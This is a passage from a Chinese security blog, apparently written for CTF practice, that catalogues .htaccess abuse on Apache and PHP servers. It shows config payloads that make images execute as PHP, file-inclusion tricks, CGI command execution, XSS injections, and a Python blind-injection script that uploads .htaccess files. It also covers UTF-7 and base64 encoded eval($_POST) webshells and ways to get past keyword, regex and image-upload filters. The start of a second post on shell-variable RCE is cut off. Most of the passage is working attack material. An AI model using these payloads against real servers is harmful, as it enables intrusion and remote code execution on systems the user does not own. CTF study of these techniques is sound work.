class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将ma.jpg 当做 PHP 执行</span><br><span class="line">&lt;FilesMatch  &quot;ma.jpg&quot;&gt;</span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>AddType&#x2F;AddHandler</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#将jpg后缀当作php代码执行</span><br><span class="line">AddHandler application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure></li></ul><p><img src="/archives/4e0ee84d/QQ20250322-214236.png"></p><p><img src="/archives/4e0ee84d/QQ20250322-214419.png"></p><p><img src="/archives/4e0ee84d/QQ20250322-214259.png"></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>可通过php_value指令设置 <code>auto_prepend_file</code>或者 <code>auto_append_file</code> 配置选项包含一些敏感文件，但需要本目录或者子目录有可执行的php文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#在主文件解析之前自动解析包含ma.jpg的内容</span><br><span class="line">php_value auto_prepend_file ma.jpg</span><br><span class="line"></span><br><span class="line">#在主文件解析后自动解析ma.jpg的内容</span><br><span class="line">php_value auto_append_file ma.jpg</span><br></pre></td></tr></table></figure><p><img src="/archives/4e0ee84d/QQ20250322-215144.png"></p><p><img src="/archives/4e0ee84d/QQ20250322-215205.png"></p><h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p><strong>前提：php.ini的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON使include&#x2F;require函数能够使用。</strong></p><blockquote><p>因为all_url_include 的配置范围为 PHP_INI_SYSTEM,所以无法利用 php_flag 在 .htaccess 中开启</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file http://xxx/ma.php</span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="配合伪协议"><a href="#配合伪协议" class="headerlink" title="配合伪协议"></a>配合伪协议</h4><p>这里可利用<code>data://</code>伪协议进行命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#allow_url_fopen: on,allow_url_include: on </span><br><span class="line">php_value auto_append_file &quot;data://test/plain,&lt;?php phpinfo();?&gt;&quot;</span><br></pre></td></tr></table></figure><h4 id="解析-htaccess自身执行命令"><a href="#解析-htaccess自身执行命令" class="headerlink" title="解析.htaccess自身执行命令"></a>解析.htaccess自身执行命令</h4><p>不仅如此，.htaccess还可以通过包含自己来进行命令执行：</p><ul><li><p><strong>当前目录有php执行文件的情况下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#&lt;?php phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/archives/4e0ee84d/QQ20250322-220911.png"></p><p><img src="/archives/4e0ee84d/QQ20250322-221006.png"></p></li><li><p><strong>当前目录没有php执行文件的情况下</strong></p><p>关键：<strong>需要先设置允许可访问 .htaccess 文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files .htaccess&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">Require all granted</span><br><span class="line">php_flag engine on</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line">#&lt;?php phpinfo();</span><br></pre></td></tr></table></figure><blockquote><p>也可以利用<code>&lt;FilesMatch</code></p></blockquote><p><img src="/archives/4e0ee84d/QQ20250322-221809.png"></p><p><img src="/archives/4e0ee84d/QQ20250322-221745.png"></p></li></ul><h4 id="CGI脚本执行"><a href="#CGI脚本执行" class="headerlink" title="CGI脚本执行"></a>CGI脚本执行</h4><p>参考：[De1CTF2020 check in](<a href="https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check">https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check</a> in)</p><p><strong>CGI（Common Gateway Interface）</strong> 是一种标准协议，允许 Web 服务器（如 Apache）与外部程序（如 Shell、Python、Perl 脚本）交互。即我们可以通过cgi来执行shell等脚本。</p><p>前提：<strong>启用了cgi模块，同时<code>cgi_module</code>需要加载，即apache配置文件中有</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule cgi_module modules/mod_cgi.so</span><br></pre></td></tr></table></figure><blockquote><p>启用cgi模块要根据 MPM 类型选择模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache2ctl -V | grep MPM</span><br><span class="line"># 输出示例：Server MPM: prefork</span><br></pre></td></tr></table></figure><p><strong><code>prefork</code> MPM</strong> → 使用 <code>mod_cgi</code>：<code>a2enmod cgi</code></p><p><strong><code>worker</code>&#x2F;<code>event</code> MPM</strong> → 使用 <code>mod_cgid</code>：<code>a2enmod cgid</code></p></blockquote><p>在.htaccess文件中添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI   #允许在指定目录下执行 CGI脚本</span><br><span class="line">AddHandler cgi-script .sh  #将扩展名为 .sh 的文件关联到 CGI脚本处理器。</span><br></pre></td></tr></table></figure><p>再写一个简单的CGI脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-type: text/plain\r\n&quot;</span>  <span class="comment">#必需的HTTP头信息</span></span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>访问sh文件即可：</p><p><img src="/archives/4e0ee84d/QQ20250322-231223.png"></p><p><img src="/archives/4e0ee84d/QQ20250322-231454.png"></p><blockquote><p>复现不成功可能是因为文件权限不够，可以赋予脚本执行权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /var/www/html/1.sh</span><br></pre></td></tr></table></figure></blockquote><h4 id="FastCGI脚本执行"><a href="#FastCGI脚本执行" class="headerlink" title="FastCGI脚本执行"></a>FastCGI脚本执行</h4><p>与CGI一样可以和外部程序交互，但<code>mod_fcgid.so</code>需要被加载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule fcgid_module modules/mod_fcgid.so</span><br></pre></td></tr></table></figure><blockquote><p>下载fcgid：<code>apt-get install libapache2-mod-fcgid</code></p><p>启动：<code>a2enmod fcgid</code></p></blockquote><p>.htaccess:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI  #允许在指定目录下执行CGI或FastCGI脚本。</span><br><span class="line">AddHandler fcgid-script .xx  #将扩展名为.xx 的文件关联到FastCGI处理器(mod_fcgid)。</span><br><span class="line">FcgidWrapper &quot;/bin/sh&quot; .xx  #指定用于执行.xx 文件的 解释器路径。</span><br></pre></td></tr></table></figure><p>1.xx:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-Type: text/plain&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>访问1.xx即可</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file"></a>highlight_file</h4><p>主要通过.hataccess文件设定<strong>highlight.comment</strong>，指定高亮内容，进行XSS。</p><p>.htaccess:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.comment &#x27;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#x27;</span><br></pre></td></tr></table></figure><blockquote><p><code>highlight.comment</code> 是 PHP 的语法高亮配置选项，用于定义 <strong>注释部分的颜色</strong>（如 <code>#FF8000</code>）。</p></blockquote><p>其中highlight.comment也可换成如下其他选项：</p><p><img src="/archives/4e0ee84d/QQ20250323-153718.png"></p><p>1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// comment</span></span><br></pre></td></tr></table></figure><p>原理就是<code>highlight_file(__FILE__)</code>函数会输出当前文件的内容，并用PHP语法高亮显示。这意味着<strong>它会将PHP代码转换为带有颜色标记的HTML代码。</strong>注释部分（以<code>//</code>或<code>#</code>开头的行，以及<code>/* */</code>之间的内容）会根据<code>highlight.comment</code>的设置进行高亮，当定义高亮内容时，<strong>PHP会将内容直接穿插在<code>&lt;span&gt;</code>标签的style属性中，且未转义特殊字符</strong>，导致HTML结构被破坏，即最后产生的HTML片段为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color: &quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;// comment<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>刚好闭合了前面的<code>&lt;&quot;</code></strong></p></blockquote><p><img src="/archives/4e0ee84d/QQ20250323-155658.png"></p><p><img src="/archives/4e0ee84d/QQ20250323-154715.png"></p><h4 id="错误信息链接"><a href="#错误信息链接" class="headerlink" title="错误信息链接"></a>错误信息链接</h4><p>通过 <code>.htaccess</code> 设置 <code>php_value docref_root</code>，结合 PHP 错误信息的 <strong>HTML 渲染机制</strong>，可在错误页面中注入<strong>未转义的脚本代码</strong>，触发 XSS 攻击。</p><p>1.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;foo&#x27;</span>);<span class="comment">#包含不存在的文件促发PHP错误</span></span><br></pre></td></tr></table></figure><p>.htaccess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_flag display_errors 1       # 允许显示错误信息</span><br><span class="line">php_flag html_errors 1          # 将错误信息格式化为HTML</span><br><span class="line">php_value docref_root &quot;&#x27;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;  # 注入恶意字符串</span><br></pre></td></tr></table></figure><blockquote><p><code>docref_root</code> 是 PHP 的配置选项，用于定义 <strong>错误消息中链接的 PHP 官方文档的根 URL</strong>，这里直接改成我们的恶意代码</p></blockquote><p><img src="/archives/4e0ee84d/QQ20250323-162725.png"></p><h3 id="利用404页面盲注"><a href="#利用404页面盲注" class="headerlink" title="利用404页面盲注"></a>利用404页面盲注</h3><p>.htaccess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;If &quot;file(&#x27;/flag&#x27;) =~ &#x27;/flag&#123;a/&#x27;&quot;&gt;</span><br><span class="line">ErrorDocument 404 &quot;b1uel0n3&quot;</span><br><span class="line">&lt;/If&gt;</span><br></pre></td></tr></table></figure><p>利用匹配成功返回带有b1uel0n3的404内容进行盲注来获取flag</p><p>盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://example.com/upload.php&quot;</span>  <span class="comment"># 文件上传接口</span></span><br><span class="line">CHECK_URL = <span class="string">&quot;http://example.com/not_exist_path&quot;</span>  <span class="comment"># 触发404的路径</span></span><br><span class="line">FLAG_PREFIX = <span class="string">&quot;flag&#123;&quot;</span>  <span class="comment"># Flag已知前缀</span></span><br><span class="line">CHARSET = string.ascii_letters + string.digits + <span class="string">&quot;_!@#$%^&amp;*()-=+&#123;&#125;&quot;</span>  <span class="comment"># 字符集</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_htaccess</span>(<span class="params">payload</span>):</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, payload, <span class="string">&#x27;text/plain&#x27;</span>)&#125;</span><br><span class="line">    r = requests.post(TARGET_URL, files=files)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text  <span class="comment"># 根据上传接口返回判断是否成功</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_response</span>():</span><br><span class="line">    r = requests.get(CHECK_URL)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;b1uel0n3&quot;</span> <span class="keyword">in</span> r.text  <span class="comment"># 自定义404响应关键词</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_injection</span>():</span><br><span class="line">    flag = FLAG_PREFIX</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> CHARSET:</span><br><span class="line">            current_guess = flag + c</span><br><span class="line">            <span class="comment"># 构造正则匹配规则：当前猜测字符 + 后续任意字符直到&#125;</span></span><br><span class="line">            regex = <span class="string">f&quot;^<span class="subst">&#123;re.escape(current_guess)&#125;</span>.*\\&#125;&#125;$&quot;</span></span><br><span class="line">            htaccess_content = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;If &quot;file(&#x27;/flag&#x27;) =~ /<span class="subst">&#123;regex&#125;</span>/&quot;&gt;</span></span><br><span class="line"><span class="string">    ErrorDocument 404 &quot;b1uel0n3&quot;</span></span><br><span class="line"><span class="string">&lt;/If&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> upload_htaccess(htaccess_content):</span><br><span class="line">                <span class="keyword">if</span> check_response():</span><br><span class="line">                    flag += c</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Current Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">if</span> c == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;[!] Flag found:&quot;</span>, flag)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Failed to find next character&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    blind_injection()</span><br></pre></td></tr></table></figure><h3 id="利用报错日志写马"><a href="#利用报错日志写马" class="headerlink" title="利用报错日志写马"></a>利用报错日志写马</h3><p>参考：[<a href="https://buuoj.cn/challenges#[XNUCA2019Qualifier]EasyPHP">XNUCA2019Qualifier]EasyPHP</a></p><p>思路就是error_log能将<strong>PHP运行报错的记录写到指定文件</strong>，而<code>include_path</code> 是 PHP 的配置选项，用于定义 PHP 在包含文件（如 <code>include</code>、<code>require</code>）时搜索文件的目录列表。当使用相对路径或未指定路径时，<strong>PHP 会按照 <code>include_path</code> 中设置的目录顺序查找文件。</strong></p><p><strong>所以我们通过.htaccess文件设定error_log选项来定义我们错误文件的存储路径，再配合include_path将🐎当作错误路径解析从而将🐎写入文件</strong></p><p>error.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;fooo&#x27;</span>);<span class="comment">#包含不存在的文件促发PHP错误</span></span><br></pre></td></tr></table></figure><p>.htaccess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log /var/www/html/shell.php</span><br><span class="line">php_value include_path &quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span><br></pre></td></tr></table></figure><p><img src="/archives/4e0ee84d/QQ20250323-171432.png"></p><p>可以看到我们的路径成功写进去了，但存在<code>&lt;&gt;</code>被html编码转义问题。</p><p>这里我们需要用<strong>UTF-7编码</strong>来进行绕过，这里参考[XNUCA2019Qualifier]EasyPHP的解法：</p><p>先将带有<strong>UTF-7编码转换的🐎写入文件</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;+ADw?php eval(+ACQAXw-POST+AFs&#x27;a&#x27;+AF0)+ADs?+AD4-&quot;</span><br><span class="line">php_value error_log /tmp/fl3g.php</span><br></pre></td></tr></table></figure><blockquote><p>一般来说www-data在<code>/var/www/html</code>都没有写的权限的，所以写入<code>/tmp/</code>目录下</p></blockquote><p>然后利用UTF-7来解析写了🐎的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;/tmp&quot;   #指定目录找包含文件</span><br><span class="line">php_flag zend.multibyte 1       #启用 PHP 的多字节字符编码支持（如 UTF-8、UTF-7）。</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot; #指定 PHP 脚本文件的字符编码为 UTF-7。</span><br></pre></td></tr></table></figure><p>此时已经包含了上传的🐎文件，直接访问主文件连蚁剑或者RCE即可</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><h4 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="\反斜杠绕过"></a>\反斜杠绕过</h4><p>对于关键字的过滤我们可以利用<code>\</code>绕过，在.htaccess中<strong>支持<code>\</code>拼接上下两行</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p\</span><br><span class="line">hp_value auto_prepend_fi\</span><br><span class="line">le ma.jpg</span><br></pre></td></tr></table></figure><h4 id="UTF-7编码绕过"><a href="#UTF-7编码绕过" class="headerlink" title="UTF-7编码绕过"></a>UTF-7编码绕过</h4><p>对于<code>&lt;?</code>等字符的检测可以用UTF-7编码来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">#+ADw-?php+ACA-+AEA-eval(+ACQ-+AF8-POST+AFs-&#x27;shell&#x27;+AF0-)+ADs-+ACA-?+AD4-</span><br></pre></td></tr></table></figure><h4 id="伪协议绕过"><a href="#伪协议绕过" class="headerlink" title="伪协议绕过"></a>伪协议绕过</h4><p>同样对于过滤<code>&lt;?php</code>等敏感内容也可以采用php:&#x2F;&#x2F;filter伪协议配合base64等其他编码绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.hatccess：</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_fi\</span><br><span class="line">le &quot;php://filter/convert.base64-decode/resource=ma.jpg&quot;</span><br><span class="line"></span><br><span class="line">ma.jpg:</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW2FdKTsgPz4=</span><br></pre></td></tr></table></figure><h3 id="脏字符绕过"><a href="#脏字符绕过" class="headerlink" title="脏字符绕过"></a>脏字符绕过</h3><p>参考：[<a href="https://buuoj.cn/challenges#[XNUCA2019Qualifier]EasyPHP">XNUCA2019Qualifier]EasyPHP</a></p><p>如一些题中会在我们写入的文件内容中添加一些脏字符如<code>\nJust one chance</code>使我们的文件失效</p><p>这时我们可以通过<strong>添加<code>#\</code>的方式</strong>来绕过，<code>\</code>将后面的斜杠进行<strong>转义成普通字符，再通过<code>#</code>注释掉后面的内容即可</strong></p><h3 id="回溯绕过preg-match"><a href="#回溯绕过preg-match" class="headerlink" title="回溯绕过preg_match"></a>回溯绕过preg_match</h3><p><img src="/archives/4e0ee84d/QQ20250323-180913.png"></p><p>由于PHP 的配置选项 pcre.backtrack_limit 给 pcre  设定了一个回溯次数上限，默认为1000000，如果<strong>回溯次数超过这个数字，preg_match 会返回false而不是0</strong>，这时我们设置回<strong>溯次数上限为0</strong>从而直接返回false来绕过preg_match等函数正则匹配的检测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure><h3 id="绕过上传图片限制"><a href="#绕过上传图片限制" class="headerlink" title="绕过上传图片限制"></a>绕过上传图片限制</h3><p>有时在上传图片时会遇到<code>getimagesize()</code>等函数对上传的图片进行尺寸限制，<strong>只允许上传指定大小尺寸的图片</strong>，并且会使用<code>exif_imagetype()</code>函数<strong>读取第一个字节并检查其签名</strong>。这时如果.htaccess没被过滤的话，我们可以修改.htaccess内容来绕过限制。</p><p>所以我们需要找一个能满足image要求又能让.htaccess有效的.htaccess&#x2F;image多语意文件。而**.htaccess中<code>#</code>和以空字节<code>\x00</code>开头的行都能起到注释的作用<strong>，即</strong>我们要找到一个签名开头带有<code>#</code>符号或<code>\x00</code>的文件格式**</p><p>我们可以看下<code>exif_imagetype()</code>支持的图像类型：</p><p><img src="/archives/4e0ee84d/QQ%E6%88%AA%E5%9B%BE20250323195915.png"></p><p>WBMP（<strong>Wireless Bitmap）是一种 移动计算机 设备使用的标准 图像格式</strong>，WBMP文件开头是”Header” 头部。Header的第一个字节表示图片类型，目前<strong>只有0</strong>，即非压缩的黑白位图。<strong>第二个字节固定为0，第三个字节开始，分别是图像的宽度和高度</strong>，即：</p><p><img src="/archives/4e0ee84d/QQ20250323-202800.png"></p><p>那么我们可以利用<code>\x00</code>来定义尺寸绕过并且不会对让.htaccess失效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x85\x85    #后面\x85是尺寸，可修改</span><br><span class="line">AddType application/x-httpd-php 1.jpg</span><br></pre></td></tr></table></figure><p>XBM<strong>（X BitMap）是一种图像文件格式，用于X Window系统的图形界面，存储光标、图标等简单图像。</strong>而XBM文件主要<strong>使用 <code>#define</code> 定义宽、高和像素数组</strong>，因此我们可以利用XBM图像格式绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 16</span><br><span class="line">#define height 16</span><br><span class="line">AddType application/x-httpd-php 1.jpg</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://eastjun.top/posts/htaccess_use/">htaccess利用总结</a></p><p><a href="https://www.jiwo.org/ken/detail.php?id=3074">文件上传之.htaccess的一些技巧</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/116666720">[CTF].htaccess的使用技巧总结</a></p><p><a href="https://www.anquanke.com/post/id/241147#h3-22">与 .htaccess 相关的奇淫技巧</a></p><p><a href="https://xz.aliyun.com/news/7862?u_atoken=6668ff43a44a2318428095bc415d6570&u_asig=0a47314717427115150877000e003c&time__1311=n4+xRDnDgDuDBi7G8D0DBMbDyGQ89WpwhhPhD">Apache的.htaccess利用技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> .htaccess </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell变量执行RCE</title>
      <link href="/archives/6b3277d2/"/>
      <url>/archives/6b3277d2/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>shell变量实现RCE这种思路最早提出于2017年34c3CTF里的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p><p><strong>而处理这种类型的CTF，探姬师傅有个项目是可以一把梭的：<a href="https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file">https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</a></strong></p><p><strong>bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></strong></p><h3 id="shell脚本-的用法"><a href="#shell脚本-的用法" class="headerlink" title="shell脚本$的用法"></a>shell脚本$的用法</h3><p>首先先了解下linux shell脚本中$的用法</p><table><thead><tr><th>变量名</th><th>含义</th></tr></thead><tbody><tr><td>$0</td><td>脚本本身的名字</td></tr><tr><td>$1</td><td>脚本后所输入的第一串字符</td></tr><tr><td>$2</td><td>传递给该shell脚本的第二个参数</td></tr><tr><td>$*</td><td>脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</td></tr><tr><td>$@</td><td>脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</td></tr><tr><td>$_</td><td>表示上一个命令的最后一个参数</td></tr><tr><td>$#</td><td>#脚本后所输入的字符串个数</td></tr><tr><td>$$</td><td>脚本运行的当前进程ID号</td></tr><tr><td>$!</td><td>表示最后执行的后台命令的PID</td></tr><tr><td>$?</td><td>显示最后命令的退出状态，0表示没有错误，其他表示由错误</td></tr></tbody></table><h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><p>打CTF时，在过滤了字母的情况下我们可以采用八进制的形式绕过，即使用**<code>$&#39;xxx&#39;</code>（xxx为字符的八进制）的形式来执行命令<strong>，如</strong><code>$&#39;\154\163&#39;</code>表示<code>ls</code>**</p><p><img 